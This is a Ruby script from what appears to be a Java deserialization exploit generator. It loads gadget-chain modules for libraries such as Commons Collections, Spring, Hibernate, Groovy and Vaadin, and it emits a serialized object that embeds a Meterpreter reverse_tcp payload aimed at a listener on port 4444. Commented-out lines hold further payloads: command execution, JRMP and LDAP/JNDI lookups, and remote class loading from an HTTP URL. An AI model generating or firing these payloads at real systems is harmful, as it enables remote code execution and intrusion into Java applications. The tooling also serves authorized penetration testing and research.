require_relative 'classfile'
require_relative 'payloads/templates'
require_relative 'payloads/beanutils'
require_relative 'payloads/collections'
require_relative 'payloads/jrmp'
require_relative 'payloads/url'
require_relative 'payloads/c3p0'
require_relative 'payloads/spring'
require_relative 'payloads/rome'
require_relative 'payloads/groovy'
require_relative 'payloads/jython'
require_relative 'payloads/hibernate'
require_relative 'payloads/rhino'
require_relative 'payloads/json'
require_relative 'payloads/beanshell'
require_relative 'payloads/atomikos'
require_relative 'payloads/jboss'
require_relative 'payloads/vaadin'
require_relative 'meterpreter'

# register the right model files
reg = Java::Serialize::Registry.new
reg.load('model/base-java9.json')
reg.load('model/jdk-templates.json')
# reg.load("model/xalan-templates.json")

reg.load('model/collections-3.json')
reg.load('model/collections-4.json')

reg.load('model/rmi.json')
reg.load('model/corba.json')

reg.load('model/beanutils-1.9.json')
# reg.load("model/beanutils-1.8.json")

reg.load('model/c3p0.json')
reg.load('model/spring-4.json')
reg.load('model/rome.json')
reg.load('model/groovy.json')
reg.load('model/jython.json')
reg.load('model/hibernate-validator-5.json')
reg.load('model/hibernate-validator-6.json')

config = {
  'LHOST' => '127.0.0.1',
  'LPORT' => '4444',
  #  	"LPORT" => "-1",
  #	"AESPassword" => "foo",
  #	"EmbeddedStage" => "Shell",
  #	"StageParameters" => "/usr/bin/gedit"
}

# config = {"VERBOSE"=>"false", "WfsDelay"=>"0", "EnableContextEncoding"=>"false", "ContextInformationFile"=>"", "DisablePayloadHandler"=>"false", "RHOSTS"=>"127.0.0.1", "RPORT"=>"1099", "SSL"=>"false", "CHECK_REFS"=>"true", "FOLLOW_REMOTE"=>"false", "USERNAME"=>"test", "PASSWORD"=>"test", "LHOST"=>"127.0.0.1", "payload"=>"java/classfile/meterpreter/reverse_tcp", "WORKSPACE"=>"", "LPORT"=>"4444", "ReverseListenerBindPort"=>"", "ReverseAllowProxy"=>"false", "ReverseListenerComm"=>"", "ReverseListenerBindAddress"=>"", "ReverseListenerThreaded"=>"false", "StagerRetryCount"=>"10", "StagerRetryWait"=>"5", "PayloadUUIDSeed"=>"", "PayloadUUIDRaw"=>"", "PayloadUUIDName"=>"", "PayloadUUIDTracking"=>"false", "EnableStageEncoding"=>"false", "StageEncoder"=>"", "StageEncoderSaveRegisters"=>"", "StageEncodingFallback"=>"true", "AESPassword"=>"", "Spawn"=>"0", "AutoLoadStdapi"=>"true", "AutoVerifySession"=>"true", "AutoVerifySessionTimeout"=>"30", "InitialAutoRunScript"=>"", "AutoRunScript"=>"", "AutoSystemInfo"=>"true", "EnableUnicodeEncoding"=>"false", "HandlerSSLCert"=>"", "SessionRetryTotal"=>"3600", "SessionRetryWait"=>"10", "SessionExpirationTimeout"=>"604800", "SessionCommunicationTimeout"=>"300", "PayloadProcessCommandLine"=>"", "AutoUnhookProcess"=>"false", "TARGET"=>"0"}
#
# config = {"VERBOSE"=>"false", "WfsDelay"=>"0", "EnableContextEncoding"=>"false", "ContextInformationFile"=>"", "DisablePayloadHandler"=>"false", "RHOSTS"=>"127.0.0.1", "RPORT"=>"1099", "SSL"=>"false", "CHECK_REFS"=>"true", "FOLLOW_REMOTE"=>"false", "USERNAME"=>"test", "PASSWORD"=>"test", "LHOST"=>"127.0.0.1", "payload"=>"java/classfile/meterpreter/reverse_tcp", "WORKSPACE"=>"", "LPORT"=>"4444"}

# STDOUT.write(Java::Serialize::Classfile::gen_config_class("test", config))

oos = Java::Serialize::ObjectOutputStream.new(STDOUT, reg)
#
#
# oos.writeObject(JavaEnum.new("Ljava/nio/file/AccessMode;", "READ"))
# oos.writeObject(JavaClass.new("Ljava/nio/file/AccessMode;"))
# oos.writeObject(ObjectStreamClass.new("Ljava/nio/file/AccessMode;"))
# oos.writeObject(JavaArray.new("S", [1,2,3,4,5]))
# oos.writeObject(JavaArray.new("[S", [JavaArray.new("S", [1,2]), JavaArray.new("S", [3,4])]))
# oos.writeObject(JavaObject.new("Ljava/util/concurrent/atomic/AtomicInteger;", {"value" => 1234}))
# tpl = Java::Serialize::Payloads::Templates.make_jdk([
#	transletclazz,
#	configclazz,
#	File.read('meterpreter/metasploit/Payload.class'), # rest can go in unpatched
# ])

# oos.writeObject(Java::Serialize::Payloads::Beanutils::make_get_property(Java::Meterpreter::translet(config), "outputProperties"))

# oos.writeObject(Java::Serialize::Payloads::Collections.make_invoke_noarg(tpl, "newTransformer",version=4))
# oos.writeObject(Java::Serialize::Payloads::Collections.make_runtime_exec(["touch", "/tmp/it-workz"]))

# oos.writeObject(Java::Serialize::Payloads::JRMP::make_jrmp_client("localhost", 1337, 1222))

# oos.writeObject(Java::Serialize::Payloads::URL::make_dns_lookup("test2.zm8.sy.gs"))

# oos.writeObject(Java::Serialize::Payloads::C3P0::make_classload("http://localhost/mbechler/", "ExploitObjectFactory"))

# oos.writeObject(Java::Serialize::Payloads::Spring::make_jta("ldap://localhost:1389/cn=test/foo"))
#
# oos.writeObject(Java::Serialize::Payloads::ROME::make_properties_invoke(Java::Meterpreter::translet(config), "Ljavax/xml/transform/Templates;",legacy:true))
#
# oos.writeObject(Java::Serialize::Payloads::Groovy::make_runtime_exec("/usr/bin/gedit"))
# oos.writeObject(Java::Serialize::Payloads::Groovy::make_invoke_noarg(Java::Meterpreter::translet(config),"newTransformer"))
#
#
# oos.writeObject(Java::Serialize::Payloads::Hibernate::validator_invoke_noarg(Java::Meterpreter::translet(config),"Ljavax/xml/transform/Templates;","newTransformer"))
# oos.writeObject(Java::Serialize::Payloads::Hibernate::validator_invoke_noarg(Java::Meterpreter::translet(config),"Ljavax/xml/transform/Templates;","newTransformer",ver:5))
#

# reg.load("model/hibernate-5.json")
# reg.load("model/hibernate-4.json")
# reg.load("model/hibernate-3.json")

# oos.writeObject(Java::Serialize::Payloads::Hibernate::hibernate_invoke_noarg(Java::Meterpreter::translet(config),"Ljavax/xml/transform/Templates;","getOutputProperties",ver:3))
#

# reg.load("model/rhino.json")
#
# oos.writeObject(Java::Serialize::Payloads::Rhino::make_get_property(Java::Meterpreter::translet(config),"outputProperties"))

# reg.load("model/json.json")
# oos.writeObject(Java::Serialize::Payloads::JSON::make_getter_caller(Java::Meterpreter::translet(config),"Ljavax/xml/transform/Templates;"))

# reg.load("model/beanshell.json")
# oos.writeObject(Java::Serialize::Payloads::Beanshell::make_invoker_noarg(Java::Meterpreter::translet(config),"Ljavax/xml/transform/Templates;","newTransformer"))a
#
#
#
#
# reg.load("model/atomikos-3.json")
# reg.load("model/atomikos-4.json")
# oos.writeObject(Java::Serialize::Payloads::Atomikos::make_jta("ldap://localhost:1389/cn=test/foo"))
#
#

# reg.load("model/weld.json")
# reg.load("model/jboss.json")
# oos.writeObject(Java::Serialize::Payloads::JBoss::make_invoke_noarg(Java::Meterpreter::translet(config),"Ljavax/xml/transform/Templates;","newTransformer"))
#
#
reg.load('model/vaadin.json')
oos.writeObject(Java::Serialize::Payloads::Vaadin.make_get_property(Java::Meterpreter.translet(config), 'outputProperties'))
